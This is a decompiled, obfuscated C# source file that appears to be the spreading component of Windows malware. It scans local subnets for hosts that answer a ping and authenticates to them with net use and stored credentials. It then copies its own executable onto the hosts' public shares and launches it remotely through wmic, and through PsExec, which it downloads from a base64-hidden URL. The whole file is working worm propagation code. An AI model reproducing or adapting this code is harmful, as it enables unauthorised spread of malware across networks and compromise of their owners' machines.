using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;

namespace ALzLGBAFaCqNDAE;

internal class OHkFEexVuUw
{
	[CompilerGenerated]
	private sealed class CxpschomshrkT
	{
		public string rqIUxiLbxktna;

		public bool _003CGetIPAddresses_003Eb__0(string o)
		{
			return o != rqIUxiLbxktna;
		}
	}

	public static List<string> YWTHZXZoRLERS = new List<string>();

	public static string GilCvhZsSubZrl = "";

	public static List<string> jDwGtVhXUPsIz = new List<string>();

	public static List<string> aZynqOsBPXCcPN = new List<string>();

	public static List<string> qNZfKlUAyXazi = new List<string>();

	public static void jUcuzPteWhFoDHj()
	{
		try
		{
			List<string> first = BBDGLGtcLLoYNNO();
			qNZfKlUAyXazi = SHDOzwCXjD();
			YWTHZXZoRLERS = first.Union(qNZfKlUAyXazi).ToList();
		}
		catch
		{
			return;
		}
		string text = "";
		if (YWTHZXZoRLERS.Count > 0)
		{
			try
			{
				text = wxbTASwOVCFxs();
			}
			catch
			{
				return;
			}
		}
		try
		{
			if (File.Exists(text))
			{
				foreach (string yWTHZXZoRLER in YWTHZXZoRLERS)
				{
					if ((!yWTHZXZoRLER.StartsWith("10.") && !yWTHZXZoRLER.StartsWith("172.16.") && !yWTHZXZoRLER.StartsWith("192.168.") && !yWTHZXZoRLER.StartsWith("")) || !mDPuHMAGlgFl(yWTHZXZoRLER))
					{
						continue;
					}
					try
					{
						if (RMvUnHFCuFhAD.itFjiDWqgS == "YES")
						{
							for (int i = 0; i < jDwGtVhXUPsIz.Count; i++)
							{
								RMvUnHFCuFhAD.wRzEVCtsszv("net.exe", "use \\\\" + yWTHZXZoRLER + " /USER:" + jDwGtVhXUPsIz[i] + " " + aZynqOsBPXCcPN[i]);
								Thread.Sleep(2000);
								File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + yWTHZXZoRLER + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
								if (File.Exists("\\\\" + yWTHZXZoRLER + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
								{
									RMvUnHFCuFhAD.wRzEVCtsszv("wmic.exe", "/node:" + yWTHZXZoRLER + " /user:" + jDwGtVhXUPsIz[i] + " /password:" + aZynqOsBPXCcPN[i] + " process call create \"cmd.exe /c \\" + yWTHZXZoRLER + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location) + "\"");
								}
							}
						}
						else
						{
							RMvUnHFCuFhAD.wRzEVCtsszv("net.exe", "use \\\\" + yWTHZXZoRLER);
							Thread.Sleep(2000);
							File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + yWTHZXZoRLER + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
							if (File.Exists("\\\\" + yWTHZXZoRLER + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
							{
								RMvUnHFCuFhAD.wRzEVCtsszv("wmic.exe", "/node:" + yWTHZXZoRLER + " process call create cmd.exe \"/c \\" + yWTHZXZoRLER + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location) + "\"");
							}
						}
					}
					catch
					{
					}
					if (RMvUnHFCuFhAD.itFjiDWqgS == "YES")
					{
						for (int j = 0; j < jDwGtVhXUPsIz.Count; j++)
						{
							RMvUnHFCuFhAD.wRzEVCtsszv(text, "\\" + yWTHZXZoRLER + " -u " + jDwGtVhXUPsIz[j] + " -p " + aZynqOsBPXCcPN[j] + " -d -f -h -s -i -n 5 -c " + Assembly.GetEntryAssembly()!.Location);
						}
					}
					else
					{
						RMvUnHFCuFhAD.wRzEVCtsszv(text, "\\" + yWTHZXZoRLER + " -d -f -h -s -i -n 5 -c " + Assembly.GetEntryAssembly()!.Location);
					}
				}
			}
		}
		catch
		{
			return;
		}
		List<QJmUvpITudv> list = QJmUvpITudv.IgPFocqsdeuvm();
		foreach (QJmUvpITudv item in list)
		{
			try
			{
				if ((item.EGtKxHcFbndVxtw.StartsWith("10.") || item.EGtKxHcFbndVxtw.StartsWith("172.16.") || item.EGtKxHcFbndVxtw.StartsWith("192.168.") || item.EGtKxHcFbndVxtw.StartsWith("")) && mDPuHMAGlgFl(item.EGtKxHcFbndVxtw))
				{
					ljQYfFbjIjTbHR.jjWOuFUGHOxtaU(item.tXnCLsnIorlCDQ, item.EGtKxHcFbndVxtw, "255.255.255.0");
				}
			}
			catch
			{
				return;
			}
		}
		foreach (QJmUvpITudv item2 in list)
		{
			try
			{
				Regex regex = new Regex(".");
				string jkitlStquTdfRmG = regex.Split(item2.EGtKxHcFbndVxtw)[0] + "." + regex.Split(item2.EGtKxHcFbndVxtw)[1] + "." + regex.Split(item2.EGtKxHcFbndVxtw)[2];
				List<string> first2 = JXHzPBkJtqLy.CCYmVaYiuTo(jkitlStquTdfRmG);
				List<string> list2 = first2.Union(qNZfKlUAyXazi).ToList();
				list2.AddRange(qNZfKlUAyXazi);
				foreach (string item3 in list2)
				{
					string text2 = (GilCvhZsSubZrl = item3);
					foreach (string item4 in list2)
					{
						if ((!item4.StartsWith("10.") && !item4.StartsWith("172.16.") && !item4.StartsWith("192.168.") && !item4.StartsWith("")) || !mDPuHMAGlgFl(item4))
						{
							continue;
						}
						try
						{
							if (RMvUnHFCuFhAD.itFjiDWqgS == "YES")
							{
								for (int k = 0; k < jDwGtVhXUPsIz.Count; k++)
								{
									RMvUnHFCuFhAD.wRzEVCtsszv("net.exe", "use \\\\" + item4 + " /USER:" + jDwGtVhXUPsIz[k] + " " + aZynqOsBPXCcPN[k]);
									Thread.Sleep(2000);
									File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
									if (File.Exists("\\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
									{
										RMvUnHFCuFhAD.wRzEVCtsszv("wmic.exe", "/node:" + item4 + " /user:" + jDwGtVhXUPsIz[k] + " /password:" + aZynqOsBPXCcPN[k] + " process call create \"cmd.exe /c \\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location) + "\"");
									}
								}
							}
							else
							{
								RMvUnHFCuFhAD.wRzEVCtsszv("net.exe", "use \\\\" + text2);
								Thread.Sleep(2000);
								File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
								if (File.Exists("\\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
								{
									RMvUnHFCuFhAD.wRzEVCtsszv("wmic.exe", "/node:" + item4 + " process call create cmd.exe \"/c \\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location) + "\"");
								}
							}
						}
						catch
						{
						}
						if (RMvUnHFCuFhAD.itFjiDWqgS == "YES")
						{
							for (int l = 0; l < jDwGtVhXUPsIz.Count; l++)
							{
								RMvUnHFCuFhAD.wRzEVCtsszv(text, "\\" + item4 + " -u " + jDwGtVhXUPsIz[l] + " -p " + aZynqOsBPXCcPN[l] + " -d -f -h -s -i -n 5 -c " + Assembly.GetEntryAssembly()!.Location);
							}
						}
						else
						{
							RMvUnHFCuFhAD.wRzEVCtsszv(text, "\\" + item4 + " -d -f -h -s -i -n 5 -c " + Assembly.GetEntryAssembly()!.Location);
						}
					}
				}
			}
			catch
			{
				return;
			}
		}
		if (File.Exists(text))
		{
			File.Delete(text);
		}
	}

	public static List<string> BBDGLGtcLLoYNNO()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string wxbTASwOVCFxs()
	{
		if (IntPtr.Size == 8)
		{
			return VnBrkoZRoscPbrEE(new Uri(RMvUnHFCuFhAD.tRvIdsqgaYol("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return VnBrkoZRoscPbrEE(new Uri(RMvUnHFCuFhAD.tRvIdsqgaYol("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static bool mDPuHMAGlgFl(string FWnQVMmJszkOg)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(FWnQVMmJszkOg);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string VnBrkoZRoscPbrEE(Uri OVCsyjWnva)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(OVCsyjWnva, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> SHDOzwCXjD()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration ");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item("IpEnabled"))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item("IPAddress");
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			foreach (string rqIUxiLbxktna in array4)
			{
				if (rqIUxiLbxktna.Contains(":"))
				{
					array = array.Where((string o) => o != rqIUxiLbxktna).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}
}
